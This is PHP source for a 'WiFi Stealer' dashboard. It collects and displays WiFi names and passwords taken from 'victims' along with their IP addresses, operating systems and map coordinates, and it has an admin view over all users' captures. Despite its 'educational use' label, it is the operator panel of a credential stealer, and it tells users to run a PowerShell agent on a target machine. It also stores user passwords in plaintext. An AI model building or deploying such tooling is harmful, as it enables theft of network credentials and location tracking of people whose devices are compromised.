<?php
/**
 * WiFi Stealer Dashboard – Multi-User Edition
 * =============================================
 * Features:
 *  - Multiple student accounts (isolated per-user log files)
 *  - Admin account can create / delete users and view activity log
 *  - Email stored per user so admin can contact/identify students
 *  - Activity log records every login (who, when, IP)
 *  - Admin can see ALL students' captured data; students only see their own
 */

session_start();
date_default_timezone_set('Asia/Kolkata');

// ──────────────────────────────────────────────────────────────
//  PATHS
// ──────────────────────────────────────────────────────────────
define('USERS_FILE',    __DIR__ . '/users.json');
define('ACTIVITY_LOG',  __DIR__ . '/activity.log');
define('CREDS_DIR',     __DIR__ . '/creds');          // per-user wifi creds

// Ensure creds directory exists
if (!is_dir(CREDS_DIR)) {
    mkdir(CREDS_DIR, 0755, true);
}

// ──────────────────────────────────────────────────────────────
//  HELPER FUNCTIONS
// ──────────────────────────────────────────────────────────────
function h($v) {
    return htmlspecialchars((string)$v, ENT_QUOTES, 'UTF-8');
}

/** Load users from JSON file. */
function load_users(): array {
    if (!file_exists(USERS_FILE)) return [];
    $raw = file_get_contents(USERS_FILE);
    $data = json_decode($raw, true);
    return $data['users'] ?? [];
}

/** Save users back to JSON file. */
function save_users(array $users): void {
    file_put_contents(USERS_FILE, json_encode(['users' => $users], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
}

/** Find a user by username (case-insensitive). */
function find_user(string $username): ?array {
    foreach (load_users() as $u) {
        if (strtolower($u['username']) === strtolower($username)) {
            return $u;
        }
    }
    return null;
}

/** Log an activity entry. */
function log_activity(string $username, string $action, string $detail = ''): void {
    $ip   = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $line = implode(' | ', [date('Y-m-d H:i:s'), $username, $ip, $action, $detail]);
    file_put_contents(ACTIVITY_LOG, $line . PHP_EOL, FILE_APPEND | LOCK_EX);
}

/** Return the log file path for a given username. */
function user_log_file(string $username): string {
    $safe = preg_replace('/[^a-z0-9_\-]/i', '_', $username);
    return CREDS_DIR . '/' . $safe . '_wifi_creds.log';
}

/** Safe HTML escape. */
function parse_capture_line($line): ?array {
    $line = trim($line);
    if ($line === '') return null;

    $fields = str_getcsv($line);
    if (count($fields) < 5) return null;

    $timeStr     = trim($fields[0] ?? '');
    $victimId    = trim($fields[1] ?? '');
    $ssid        = trim($fields[2] ?? '');
    $pass        = trim($fields[3] ?? '');
    $victimLanIp = trim($fields[4] ?? '');
    $victimOs    = trim($fields[5] ?? '');
    $publicIp    = trim($fields[6] ?? '');
    $lanIpExtra  = trim($fields[7] ?? '');
    $latitude    = trim($fields[8] ?? '');
    $longitude   = trim($fields[9] ?? '');
    $pktSummary  = trim($fields[10] ?? '');

    $badSsids = ['profile_name', 'ssid', 'SSID', 'IP', 'OS', 'Pass', 'password'];
    if ($ssid === '' || in_array($ssid, $badSsids, true) || in_array($pass, ['Pass', 'password'], true)) {
        return null;
    }
    if ($pass === '') $pass = '(Not Found)';

    $timestampRaw    = $timeStr !== '' ? $timeStr : 'unknown';
    $timestampPretty = $timestampRaw;
    if ($timestampRaw !== 'unknown') {
        $ts = strtotime($timestampRaw);
        if ($ts !== false) $timestampPretty = date('d M Y, h:i A', $ts);
    }

    $passLength   = strlen($pass);
    $allLetters   = ($pass !== '' && ctype_alpha($pass));
    $allNumbers   = ($pass !== '' && ctype_digit($pass));
    $weakPassword = ($passLength < 8 || $allLetters || $allNumbers);

    return [
        'time_raw'     => $timestampRaw,
        'time'         => $timestampPretty,
        'victim_id'    => $victimId !== '' ? $victimId : 'unknown',
        'ssid'         => $ssid,
        'password'     => $pass,
        'len'          => $passLength,
        'weak'         => $weakPassword,
        'ip_main'      => $victimLanIp !== '' ? $victimLanIp : 'offline',
        'os'           => $victimOs    !== '' ? $victimOs    : 'unknown',
        'public_ip'    => $publicIp    !== '' ? $publicIp    : 'unknown',
        'lan_ip_extra' => $lanIpExtra  !== '' ? $lanIpExtra  : 'N/A',
        'latitude'     => $latitude    !== '' ? $latitude    : 'N/A',
        'longitude'    => $longitude   !== '' ? $longitude   : 'N/A',
        'pkt_summary'  => $pktSummary  !== '' ? $pktSummary  : 'N/A',
    ];
}

function detectOS($userAgent): string {
    $ua = strtolower($userAgent);
    if (strpos($ua, 'windows') !== false) return 'Windows';
    if (strpos($ua, 'android') !== false) return 'Android';
    if (strpos($ua, 'iphone') !== false || strpos($ua, 'ipad') !== false) return 'iOS';
    if (strpos($ua, 'mac') !== false) return 'macOS';
    if (strpos($ua, 'linux') !== false) return 'Linux';
    return 'Unknown';
}

// ──────────────────────────────────────────────────────────────
//  HANDLE LOGOUT
// ──────────────────────────────────────────────────────────────
if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    log_activity($_SESSION['login_user'] ?? 'unknown', 'LOGOUT');
    $_SESSION = [];
    if (ini_get("session.use_cookies")) {
        $p = session_get_cookie_params();
        setcookie(session_name(), '', time() - 42000, $p["path"], $p["domain"], $p["secure"], $p["httponly"]);
    }
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// ──────────────────────────────────────────────────────────────
//  HANDLE LOGIN POST
// ──────────────────────────────────────────────────────────────
$loginError = '';
$registerError = '';
$registerSuccess = '';

if (isset($_POST['form_type'])) {

    // ── LOGIN ──
    if ($_POST['form_type'] === 'login') {
        $u = trim($_POST['username'] ?? '');
        $p = $_POST['password'] ?? '';
        $user = find_user($u);

        if ($user && ($user['active'] ?? true) && password_verify($p, $user['password_hash'])) {
            $_SESSION['logged_in']  = true;
            $_SESSION['login_user'] = $user['username'];
            $_SESSION['role']       = $user['role'];
            $_SESSION['email']      = $user['email'] ?? '';
            log_activity($user['username'], 'LOGIN', 'role=' . $user['role']);
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $loginError = 'Invalid username or password, or account is disabled.';
            log_activity($u, 'FAILED_LOGIN', 'IP=' . ($_SERVER['REMOTE_ADDR'] ?? '?'));
        }
    }

    // ── REGISTER (admin-only from admin panel) ──
    elseif ($_POST['form_type'] === 'create_user' && isset($_SESSION['logged_in']) && $_SESSION['role'] === 'admin') {
        $newUser  = trim($_POST['new_username']  ?? '');
        $newPass  = $_POST['new_password']  ?? '';
        $newEmail = trim($_POST['new_email'] ?? '');
        $newRole  = in_array($_POST['new_role'] ?? '', ['admin', 'student']) ? $_POST['new_role'] : 'student';

        if ($newUser === '' || $newPass === '' || $newEmail === '') {
            $registerError = 'All fields are required.';
        } elseif (!filter_var($newEmail, FILTER_VALIDATE_EMAIL)) {
            $registerError = 'Invalid email address.';
        } elseif (find_user($newUser) !== null) {
            $registerError = "Username '{$newUser}' already exists.";
        } elseif (strlen($newPass) < 8) {
            $registerError = 'Password must be at least 8 characters.';
        } else {
            $users = load_users();
            $users[] = [
                'username'       => $newUser,
                'password_hash'  => password_hash($newPass, PASSWORD_BCRYPT, ['cost' => 12]),
                'password_plain' => $newPass,   // stored for admin visibility in closed lab
                'email'          => $newEmail,
                'role'           => $newRole,
                'created_at'     => date('c'),
                'created_by'     => $_SESSION['login_user'],
                'active'         => true,
            ];
            save_users($users);
            log_activity($_SESSION['login_user'], 'CREATE_USER', "new_user={$newUser} role={$newRole} email={$newEmail}");
            $registerSuccess = "User '{$newUser}' created successfully!";
        }
    }

    // ── TOGGLE USER ACTIVE (admin) ──
    elseif ($_POST['form_type'] === 'toggle_user' && isset($_SESSION['logged_in']) && $_SESSION['role'] === 'admin') {
        $targetUser = trim($_POST['target_username'] ?? '');
        if ($targetUser !== '' && $targetUser !== $_SESSION['login_user']) {
            $users = load_users();
            foreach ($users as &$u) {
                if (strtolower($u['username']) === strtolower($targetUser)) {
                    $u['active'] = !($u['active'] ?? true);
                    log_activity($_SESSION['login_user'], 'TOGGLE_USER', "target={$targetUser} active=" . ($u['active'] ? 'true' : 'false'));
                    break;
                }
            }
            unset($u);
            save_users($users);
        }
        header('Location: ' . $_SERVER['PHP_SELF'] . '?tab=users');
        exit;
    }

    // ── DELETE USER (admin) ──
    elseif ($_POST['form_type'] === 'delete_user' && isset($_SESSION['logged_in']) && $_SESSION['role'] === 'admin') {
        $targetUser = trim($_POST['target_username'] ?? '');
        if ($targetUser !== '' && $targetUser !== $_SESSION['login_user']) {
            $users = array_filter(load_users(), fn($u) => strtolower($u['username']) !== strtolower($targetUser));
            save_users(array_values($users));
            log_activity($_SESSION['login_user'], 'DELETE_USER', "target={$targetUser}");
        }
        header('Location: ' . $_SERVER['PHP_SELF'] . '?tab=users');
        exit;
    }
}

// ──────────────────────────────────────────────────────────────
//  NOT LOGGED IN → SHOW LOGIN PAGE
// ──────────────────────────────────────────────────────────────
if (empty($_SESSION['logged_in'])) {
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>WiFi Stealer – Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
  *, *::before, *::after { box-sizing: border-box; }
  body {
    margin: 0;
    font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
    background: radial-gradient(circle at top left, #0f172a 0, #020617 40%, #000 100%);
    color: #e5e7eb;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
  }
  .card {
    background: rgba(15,23,42,0.97);
    border-radius: 14px;
    border: 1px solid rgba(148,163,184,0.2);
    box-shadow: 0 24px 50px rgba(0,0,0,0.7);
    padding: 32px 28px;
    width: 100%;
    max-width: 380px;
  }
  .logo {
    display: flex;
    align-items: center;
    gap: 10px;
    margin-bottom: 6px;
  }
  .logo-icon {
    width: 36px; height: 36px;
    background: linear-gradient(135deg,#4f46e5,#7c3aed);
    border-radius: 8px;
    display: flex; align-items: center; justify-content: center;
    font-size: 18px;
  }
  .logo-text { font-size: 18px; font-weight: 700; letter-spacing: -.3px; }
  .subtitle { font-size: 12px; color: #6b7280; margin-bottom: 22px; }
  .tabs { display: flex; gap: 4px; margin-bottom: 20px; }
  .tab-btn {
    flex: 1; padding: 7px; border-radius: 8px; border: none;
    cursor: pointer; font-size: 13px; font-weight: 500;
    background: transparent; color: #6b7280; transition: all .2s;
  }
  .tab-btn.active { background: rgba(79,70,229,.18); color: #818cf8; }
  .tab-btn:hover:not(.active) { color: #e5e7eb; }
  .tab-panel { display: none; }
  .tab-panel.active { display: block; }
  label { display: block; font-size: 12px; color: #9ca3af; margin-bottom: 4px; }
  input[type=text], input[type=password], input[type=email] {
    width: 100%; padding: 8px 10px; font-size: 13px;
    border-radius: 8px; border: 1px solid #334155;
    background: #0b1120; color: #e5e7eb; outline: none;
    transition: border-color .2s;
    margin-bottom: 12px;
  }
  input:focus { border-color: #4f46e5; }
  .btn {
    width: 100%; padding: 10px; border-radius: 999px;
    border: none; background: linear-gradient(135deg,#4f46e5,#7c3aed);
    color: #fff; font-size: 13px; font-weight: 600;
    cursor: pointer; transition: opacity .2s;
    margin-top: 4px;
  }
  .btn:hover { opacity: .88; }
  .alert-err { font-size: 12px; color: #fca5a5; background: rgba(239,68,68,.1);
    border: 1px solid rgba(239,68,68,.3); border-radius: 8px; padding: 8px 10px;
    margin-bottom: 12px; }
  .footer { margin-top: 20px; font-size: 11px; color: #374151; text-align: center; }
  .info-box { font-size: 11px; color: #4b5563; background: rgba(255,255,255,.03);
    border: 1px solid #1e293b; border-radius: 8px; padding: 10px; margin-bottom: 12px; }
  .info-box strong { color: #818cf8; }
</style>
</head>
<body>
<div class="card">
  <div class="logo">
    <div class="logo-icon">📡</div>
    <div class="logo-text">WiFi Stealer</div>
  </div>
  <div class="subtitle">Cybersecurity Training Dashboard – Authorized Users Only</div>

  <?php if ($loginError !== ''): ?>
    <div class="alert-err">⚠️ <?php echo h($loginError); ?></div>
  <?php endif; ?>

  <form method="post">
    <input type="hidden" name="form_type" value="login">
    <label for="username">Username</label>
    <input type="text" id="username" name="username" required autocomplete="username">
    <label for="password">Password</label>
    <input type="password" id="password" name="password" required autocomplete="current-password">
    <button type="submit" class="btn">🔐 Login</button>
  </form>

  <div class="info-box" style="margin-top:16px">
    <strong>🎓 Students:</strong> Use the credentials provided by your instructor.<br>
    <strong>🛡️ Admin:</strong> Only authorized personnel can create accounts.
  </div>

  <div class="footer">© 2026 WiFi Stealer Dashboard – Made by Zypher17 | Educational Use Only</div>
</div>
</body>
</html>
<?php
    exit;
}

// ──────────────────────────────────────────────────────────────
//  LOGGED IN – DETERMINE WHICH TAB TO SHOW
// ──────────────────────────────────────────────────────────────
$currentUser  = $_SESSION['login_user'];
$currentRole  = $_SESSION['role'] ?? 'student';
$currentEmail = $_SESSION['email'] ?? '';
$isAdmin      = ($currentRole === 'admin');
$activeTab    = $_GET['tab'] ?? 'dashboard';

// ──────────────────────────────────────────────────────────────
//  LOAD CAPTURES
// ──────────────────────────────────────────────────────────────
$allCaptures  = [];
$usersForView = [];

if ($isAdmin && $activeTab === 'dashboard') {
    // Admin sees ALL users' data, grouped by user
    foreach (load_users() as $u) {
        $logFile = user_log_file($u['username']);
        if (!file_exists($logFile)) continue;
        $lines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        foreach ($lines as $line) {
            $cap = parse_capture_line($line);
            if ($cap) {
                $cap['_owner'] = $u['username'];
                $allCaptures[] = $cap;
            }
        }
    }
} else {
    // Students see only their own log
    $logFile = user_log_file($currentUser);
    if (file_exists($logFile)) {
        $lines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        foreach ($lines as $line) {
            $cap = parse_capture_line($line);
            if ($cap) {
                $cap['_owner'] = $currentUser;
                $allCaptures[] = $cap;
            }
        }
    }
}

// Sort newest first
usort($allCaptures, fn($a, $b) => strcmp($b['time_raw'], $a['time_raw']));

// De-duplicate (same SSID+pass per owner)
$deduped = [];
$seen    = [];
foreach ($allCaptures as $cap) {
    $key = $cap['_owner'] . '|' . $cap['ssid'] . '|' . $cap['password'];
    if (!isset($seen[$key])) {
        $seen[$key]  = true;
        $deduped[]   = $cap;
    }
}

$totalCaptures = count($deduped);
$weakCount     = count(array_filter($deduped, fn($c) => $c['weak']));
$uniqueSSIDs   = count(array_unique(array_column($deduped, 'ssid')));

// Activity log (admin only)
$activityLines = [];
if ($isAdmin && $activeTab === 'activity') {
    if (file_exists(ACTIVITY_LOG)) {
        $raw = file(ACTIVITY_LOG, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $activityLines = array_reverse($raw); // newest first
    }
}

$allUsers = $isAdmin ? load_users() : [];
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>WiFi Stealer Dashboard</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  :root {
    --bg: #020617; --bg2: #0b1120; --bg3: #0f172a;
    --border: rgba(148,163,184,0.15);
    --text: #e5e7eb; --muted: #6b7280; --accent: #4f46e5;
    --green: #22c55e; --red: #ef4444; --yellow: #eab308;
    --purple: #7c3aed;
  }
  body { font-family: system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
         background: var(--bg); color: var(--text); min-height: 100vh; }

  /* ── SIDEBAR ── */
  .sidebar {
    position: fixed; left: 0; top: 0; bottom: 0; width: 200px;
    background: var(--bg3); border-right: 1px solid var(--border);
    display: flex; flex-direction: column; padding: 16px 0; z-index: 100;
  }
  .sidebar-logo { padding: 0 16px 16px; border-bottom: 1px solid var(--border); margin-bottom: 8px; }
  .sidebar-logo .name { font-size: 15px; font-weight: 700; }
  .sidebar-logo .role-badge {
    display: inline-block; font-size: 10px; padding: 2px 7px; border-radius: 999px;
    margin-top: 4px;
    background: <?php echo $isAdmin ? 'rgba(124,58,237,.25)' : 'rgba(79,70,229,.2)'; ?>;
    color: <?php echo $isAdmin ? '#c4b5fd' : '#818cf8'; ?>;
    border: 1px solid <?php echo $isAdmin ? 'rgba(124,58,237,.4)' : 'rgba(79,70,229,.3)'; ?>;
  }
  .nav-item {
    display: flex; align-items: center; gap: 10px; padding: 9px 16px;
    font-size: 13px; color: var(--muted); text-decoration: none;
    border-left: 3px solid transparent; transition: all .15s;
  }
  .nav-item:hover { color: var(--text); background: rgba(255,255,255,.04); }
  .nav-item.active { color: var(--text); background: rgba(79,70,229,.12);
                     border-left-color: var(--accent); }
  .nav-spacer { flex: 1; }
  .nav-user { padding: 12px 16px; border-top: 1px solid var(--border); font-size: 11px; color: var(--muted); }
  .nav-user .uname { font-weight: 600; color: var(--text); font-size: 12px; }
  .nav-user .email { font-size: 10px; word-break: break-all; }
  .logout-link { display: block; margin-top: 8px; font-size: 12px; color: #f87171;
                 text-decoration: none; }
  .logout-link:hover { text-decoration: underline; }

  /* ── MAIN ── */
  .main { margin-left: 200px; padding: 24px; min-height: 100vh; }

  /* ── PAGE HEADER ── */
  .page-header { margin-bottom: 20px; }
  .page-header h1 { font-size: 20px; font-weight: 700; }
  .page-header p { font-size: 13px; color: var(--muted); margin-top: 4px; }

  /* ── STAT CARDS ── */
  .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px,1fr)); gap: 12px; margin-bottom: 22px; }
  .stat-card {
    background: var(--bg3); border: 1px solid var(--border); border-radius: 10px;
    padding: 14px 16px;
  }
  .stat-card .label { font-size: 11px; color: var(--muted); margin-bottom: 6px; }
  .stat-card .value { font-size: 24px; font-weight: 700; }
  .stat-card .value.red { color: var(--red); }
  .stat-card .value.green { color: var(--green); }
  .stat-card .value.purple { color: #a78bfa; }

  /* ── TABLE ── */
  .table-wrap { overflow-x: auto; }
  table { width: 100%; border-collapse: collapse; font-size: 12px; }
  thead th { background: var(--bg3); color: var(--muted); font-weight: 500;
             padding: 10px 12px; text-align: left; border-bottom: 1px solid var(--border); }
  tbody tr { border-bottom: 1px solid rgba(148,163,184,.07); transition: background .1s; }
  tbody tr:hover { background: rgba(255,255,255,.03); }
  tbody td { padding: 9px 12px; vertical-align: middle; }
  .badge {
    display: inline-flex; align-items: center; gap: 4px;
    font-size: 10px; padding: 2px 7px; border-radius: 999px;
  }
  .badge.weak { background: rgba(239,68,68,.15); color: #fca5a5; border: 1px solid rgba(239,68,68,.3); }
  .badge.strong { background: rgba(34,197,94,.12); color: #86efac; border: 1px solid rgba(34,197,94,.25); }
  .badge.admin-role { background: rgba(124,58,237,.2); color: #c4b5fd; border: 1px solid rgba(124,58,237,.35); }
  .badge.student-role { background: rgba(79,70,229,.18); color: #818cf8; border: 1px solid rgba(79,70,229,.3); }
  .badge.active { background: rgba(34,197,94,.12); color: #86efac; border: 1px solid rgba(34,197,94,.25); }
  .badge.inactive { background: rgba(239,68,68,.12); color: #fca5a5; border: 1px solid rgba(239,68,68,.25); }

  /* ── OWNER CHIP ── */
  .owner-chip { display: inline-block; background: rgba(79,70,229,.15); color: #818cf8;
    border: 1px solid rgba(79,70,229,.25); border-radius: 6px; padding: 1px 7px; font-size: 10px; }

  /* ── PANEL ── */
  .panel { background: var(--bg3); border: 1px solid var(--border); border-radius: 12px; padding: 20px; }
  .panel-title { font-size: 14px; font-weight: 600; margin-bottom: 16px; }

  /* ── FORM ── */
  .form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
  .form-group { display: flex; flex-direction: column; gap: 5px; }
  .form-group label { font-size: 12px; color: var(--muted); }
  .form-group input, .form-group select {
    padding: 8px 10px; border-radius: 8px; border: 1px solid #334155;
    background: var(--bg2); color: var(--text); font-size: 13px; outline: none;
    transition: border-color .2s;
  }
  .form-group input:focus, .form-group select:focus { border-color: var(--accent); }
  .btn { display: inline-flex; align-items: center; gap: 6px; padding: 9px 18px;
    border-radius: 8px; border: none; font-size: 13px; font-weight: 500;
    cursor: pointer; transition: opacity .2s; }
  .btn-primary { background: linear-gradient(135deg,var(--accent),var(--purple)); color: #fff; }
  .btn-primary:hover { opacity: .85; }
  .btn-danger { background: rgba(239,68,68,.18); color: #fca5a5; border: 1px solid rgba(239,68,68,.3); }
  .btn-danger:hover { background: rgba(239,68,68,.3); }
  .btn-sm { padding: 5px 12px; font-size: 11px; border-radius: 6px; }
  .alert-err { font-size: 12px; color: #fca5a5; background: rgba(239,68,68,.1);
    border: 1px solid rgba(239,68,68,.3); border-radius: 8px; padding: 10px 12px; margin-bottom: 14px; }
  .alert-ok { font-size: 12px; color: #86efac; background: rgba(34,197,94,.08);
    border: 1px solid rgba(34,197,94,.25); border-radius: 8px; padding: 10px 12px; margin-bottom: 14px; }

  /* ── ACTIVITY LOG ── */
  .log-line { font-family: monospace; font-size: 11px; padding: 5px 10px;
    border-bottom: 1px solid rgba(255,255,255,.04); color: var(--muted); }
  .log-line:nth-child(even) { background: rgba(255,255,255,.02); }
  .log-line .ts { color: #4b5563; }
  .log-line .user { color: #818cf8; font-weight: 600; }
  .log-line .action { color: #fbbf24; }
  .log-line .action.login { color: var(--green); }
  .log-line .action.failed { color: var(--red); }
  .log-line .action.logout { color: #60a5fa; }
  .log-empty { color: var(--muted); font-size: 13px; padding: 20px; text-align: center; }

  @media (max-width: 640px) {
    .sidebar { display: none; }
    .main { margin-left: 0; padding: 16px; }
    .form-grid { grid-template-columns: 1fr; }
  }
</style>
</head>
<body>

<!-- ── SIDEBAR ── -->
<nav class="sidebar">
  <div class="sidebar-logo">
    <div style="font-size:22px;margin-bottom:4px">📡</div>
    <div class="name">WiFi Stealer</div>
    <div class="role-badge"><?php echo h(strtoupper($currentRole)); ?></div>
  </div>

  <a href="?tab=dashboard" class="nav-item <?php echo $activeTab==='dashboard'?'active':''; ?>">
    📊 Dashboard
  </a>

  <?php if ($isAdmin): ?>
  <a href="?tab=users" class="nav-item <?php echo $activeTab==='users'?'active':''; ?>">
    👥 Manage Users
  </a>
  <a href="?tab=activity" class="nav-item <?php echo $activeTab==='activity'?'active':''; ?>">
    📋 Activity Log
  </a>
  <a href="admin.php" class="nav-item" style="color:#fca5a5">
    🛡️ Full Admin Panel
  </a>
  <?php endif; ?>

  <div class="nav-spacer"></div>
  <div class="nav-user">
    <div class="uname">👤 <?php echo h($currentUser); ?></div>
    <div class="email"><?php echo h($currentEmail); ?></div>
    <a href="?action=logout" class="logout-link">⏻ Logout</a>
  </div>
</nav>

<!-- ── MAIN CONTENT ── -->
<main class="main">

<?php if ($activeTab === 'dashboard'): ?>
<!-- ────────────────── DASHBOARD TAB ────────────────── -->
<div class="page-header">
  <h1>📊 Captured WiFi Credentials</h1>
  <p><?php echo $isAdmin ? 'Admin view – showing captures from ALL students.' : "Showing your captured WiFi data."; ?></p>
</div>

<div class="stats-grid">
  <div class="stat-card">
    <div class="label">Total Captures</div>
    <div class="value purple"><?php echo $totalCaptures; ?></div>
  </div>
  <div class="stat-card">
    <div class="label">Weak Passwords</div>
    <div class="value red"><?php echo $weakCount; ?></div>
  </div>
  <div class="stat-card">
    <div class="label">Unique SSIDs</div>
    <div class="value green"><?php echo $uniqueSSIDs; ?></div>
  </div>
  <?php if ($isAdmin): ?>
  <div class="stat-card">
    <div class="label">Total Students</div>
    <div class="value"><?php echo count(array_filter(load_users(), fn($u) => $u['role']==='student')); ?></div>
  </div>
  <?php endif; ?>
</div>

<div class="panel">
  <div class="panel-title">Captured Credentials</div>
  <?php if (empty($deduped)): ?>
    <div class="log-empty">No captures yet. Run the PowerShell agent on a target machine.</div>
  <?php else: ?>
  <div class="table-wrap">
    <table>
      <thead>
        <tr>
          <?php if ($isAdmin): ?><th>Student</th><?php endif; ?>
          <th>Time</th>
          <th>SSID</th>
          <th>Password</th>
          <th>Strength</th>
          <th>IP</th>
          <th>OS</th>
          <th>Location</th>
        </tr>
      </thead>
      <tbody>
        <?php foreach ($deduped as $cap): ?>
        <tr>
          <?php if ($isAdmin): ?>
          <td><span class="owner-chip"><?php echo h($cap['_owner']); ?></span></td>
          <?php endif; ?>
          <td><?php echo h($cap['time']); ?></td>
          <td><strong><?php echo h($cap['ssid']); ?></strong></td>
          <td><code><?php echo h($cap['password']); ?></code></td>
          <td>
            <?php if ($cap['password'] === '(Not Found)'): ?>
              <span class="badge" style="background:rgba(107,114,128,.15);color:#9ca3af;border:1px solid #374151">N/A</span>
            <?php elseif ($cap['weak']): ?>
              <span class="badge weak">⚠ Weak</span>
            <?php else: ?>
              <span class="badge strong">✔ Strong</span>
            <?php endif; ?>
          </td>
          <td><?php echo h($cap['ip_main']); ?></td>
          <td><?php echo h($cap['os']); ?></td>
          <td>
            <?php if ($cap['latitude'] !== 'N/A' && $cap['longitude'] !== 'N/A'): ?>
              <a href="https://maps.google.com/?q=<?php echo h($cap['latitude'].','. $cap['longitude']); ?>"
                 target="_blank" style="color:#818cf8;font-size:11px">📍 Map</a>
            <?php else: echo 'N/A'; endif; ?>
          </td>
        </tr>
        <?php endforeach; ?>
      </tbody>
    </table>
  </div>
  <?php endif; ?>
</div>

<?php elseif ($isAdmin && $activeTab === 'users'): ?>
<!-- ────────────────── USERS TAB (ADMIN) ────────────────── -->
<div class="page-header">
  <h1>👥 Manage Users</h1>
  <p>Create student accounts and manage access. Each student sees only their own captured data.</p>
</div>

<!-- Create User Form -->
<div class="panel" style="margin-bottom:20px">
  <div class="panel-title">➕ Create New User</div>
  <?php if ($registerError !== ''): ?><div class="alert-err"><?php echo h($registerError); ?></div><?php endif; ?>
  <?php if ($registerSuccess !== ''): ?><div class="alert-ok">✔ <?php echo h($registerSuccess); ?></div><?php endif; ?>
  <form method="post">
    <input type="hidden" name="form_type" value="create_user">
    <div class="form-grid">
      <div class="form-group">
        <label>Username</label>
        <input type="text" name="new_username" required placeholder="e.g. student01" autocomplete="off">
      </div>
      <div class="form-group">
        <label>Password (min 8 chars)</label>
        <input type="password" name="new_password" required autocomplete="new-password">
      </div>
      <div class="form-group">
        <label>Email Address</label>
        <input type="email" name="new_email" required placeholder="student@college.edu">
      </div>
      <div class="form-group">
        <label>Role</label>
        <select name="new_role">
          <option value="student">Student</option>
          <option value="admin">Admin</option>
        </select>
      </div>
    </div>
    <button type="submit" class="btn btn-primary" style="margin-top:14px">➕ Create User</button>
  </form>
</div>

<!-- User List -->
<div class="panel">
  <div class="panel-title">All Users</div>
  <div class="table-wrap">
    <table>
      <thead>
        <tr>
          <th>Username</th>
          <th>Email</th>
          <th>Role</th>
          <th>Status</th>
          <th>Created At</th>
          <th>Created By</th>
          <th>Actions</th>
        </tr>
      </thead>
      <tbody>
        <?php foreach ($allUsers as $u): ?>
        <tr>
          <td><strong><?php echo h($u['username']); ?></strong>
            <?php if ($u['username'] === $currentUser): ?>
              <span style="font-size:10px;color:#6b7280"> (you)</span>
            <?php endif; ?>
          </td>
          <td><?php echo h($u['email'] ?? '-'); ?></td>
          <td>
            <span class="badge <?php echo $u['role']==='admin'?'admin-role':'student-role'; ?>">
              <?php echo h($u['role']); ?>
            </span>
          </td>
          <td>
            <span class="badge <?php echo ($u['active']??true) ? 'active':'inactive'; ?>">
              <?php echo ($u['active']??true) ? '● Active' : '○ Disabled'; ?>
            </span>
          </td>
          <td><?php echo h(date('d M Y', strtotime($u['created_at'] ?? 'now'))); ?></td>
          <td><?php echo h($u['created_by'] ?? 'setup'); ?></td>
          <td>
            <?php if ($u['username'] !== $currentUser): ?>
            <form method="post" style="display:inline">
              <input type="hidden" name="form_type" value="toggle_user">
              <input type="hidden" name="target_username" value="<?php echo h($u['username']); ?>">
              <button type="submit" class="btn btn-sm" style="background:rgba(234,179,8,.12);color:#fde047;border:1px solid rgba(234,179,8,.3)">
                <?php echo ($u['active']??true) ? '🔒 Disable' : '🔓 Enable'; ?>
              </button>
            </form>
            <form method="post" style="display:inline" onsubmit="return confirm('Delete user <?php echo h($u['username']); ?>? This cannot be undone.')">
              <input type="hidden" name="form_type" value="delete_user">
              <input type="hidden" name="target_username" value="<?php echo h($u['username']); ?>">
              <button type="submit" class="btn btn-sm btn-danger">🗑 Delete</button>
            </form>
            <?php else: ?>
            <span style="font-size:11px;color:var(--muted)">—</span>
            <?php endif; ?>
          </td>
        </tr>
        <?php endforeach; ?>
      </tbody>
    </table>
  </div>
</div>

<?php elseif ($isAdmin && $activeTab === 'activity'): ?>
<!-- ────────────────── ACTIVITY LOG TAB (ADMIN) ────────────────── -->
<div class="page-header">
  <h1>📋 Activity Log</h1>
  <p>Every login attempt, logout, and user management action is recorded here.</p>
</div>
<div class="panel">
  <div class="panel-title">Recent Events (newest first)</div>
  <?php if (empty($activityLines)): ?>
    <div class="log-empty">No activity recorded yet.</div>
  <?php else: ?>
    <?php foreach ($activityLines as $line):
        $parts = explode(' | ', $line, 5);
        $ts     = $parts[0] ?? '';
        $uname  = $parts[1] ?? '';
        $ip     = $parts[2] ?? '';
        $action = $parts[3] ?? '';
        $detail = $parts[4] ?? '';
        $actionClass = match(true) {
            str_contains($action,'LOGIN') && !str_contains($action,'FAILED') => 'login',
            str_contains($action,'FAILED') => 'failed',
            str_contains($action,'LOGOUT') => 'logout',
            default => ''
        };
    ?>
    <div class="log-line">
      <span class="ts"><?php echo h($ts); ?></span>
      &nbsp;│&nbsp;
      <span class="user"><?php echo h($uname); ?></span>
      &nbsp;│&nbsp;
      <span style="color:#4b5563"><?php echo h($ip); ?></span>
      &nbsp;│&nbsp;
      <span class="action <?php echo $actionClass; ?>"><?php echo h($action); ?></span>
      <?php if ($detail !== ''): ?>
        &nbsp;│&nbsp;<span style="color:#374151"><?php echo h($detail); ?></span>
      <?php endif; ?>
    </div>
    <?php endforeach; ?>
  <?php endif; ?>
</div>

<?php else: ?>
<!-- Fallback – redirect students away from admin tabs -->
<?php header('Location: ' . $_SERVER['PHP_SELF']); exit; ?>
<?php endif; ?>

</main>
</body>
</html>
